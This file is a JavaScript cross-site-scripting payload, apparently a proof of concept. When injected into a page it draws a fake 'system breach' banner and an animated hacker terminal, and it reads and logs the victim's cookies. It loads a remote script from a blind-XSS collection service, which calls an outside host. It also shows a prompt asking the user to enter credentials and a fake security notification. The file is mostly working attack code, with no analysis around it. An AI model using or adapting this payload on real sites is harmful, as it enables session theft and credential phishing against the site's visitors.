// Create hacker UI elements
const breachAlert = document.createElement('div');
breachAlert.id = 'xss-breach-alert';
breachAlert.textContent = '⚠️ SYSTEM BREACH DETECTED ⚠️ :: Security Alert :: Unauthorized Access';

const terminal = document.createElement('div');
terminal.id = 'xss-terminal';
terminal.innerHTML = `
  <div>> Initializing exploit framework...</div>
  <div>> Bypassing security protocols...</div>
  <div>> Establishing persistence...</div>
  <div>> Scanning for sensitive data...</div>
`;

document.body.prepend(breachAlert);
document.body.appendChild(terminal);

// Simulate typing effect
const commands = [
  "> User session compromised",
  "> Cookies extracted successfully",
  "> CSRF tokens identified",
  "> Preparing data exfiltration",
  "> Connection established with C2 server"
];

let i = 0;
const hackerTyper = setInterval(() => {
  if (i < commands.length) {
    const line = document.createElement('div');
    line.textContent = commands[i];
    terminal.appendChild(line);
    terminal.scrollTop = terminal.scrollHeight;
    i++;
  } else {
    clearInterval(hackerTyper);
  }
}, 1500);

// Cookie theft simulation (would be real in actual exploit)
const cookies = document.cookie;
console.log('[XSS] Cookies intercepted:', cookies);

// Blind XSS integration
const blindXss = document.createElement('script');
blindXss.src = 'https://xss.report/c/hacksysjsec';
document.head.appendChild(blindXss);

// Multiple alert styles
setTimeout(() => {
  alert('Security Alert: XSS Vulnerability Detected');
}, 3000);

setTimeout(() => {
  prompt('System Message: Enter credentials to verify your identity', '');
}, 5000);

// Fake system notification
setTimeout(() => {
  Notification.requestPermission().then(perm => {
    if (perm === "granted") {
      new Notification("Security Breach", {
        body: "Your session has been compromised",
        icon: "https://tauhamolza9o9.github.io/poc/warning.png"
      });
    }
  });
}, 7000);
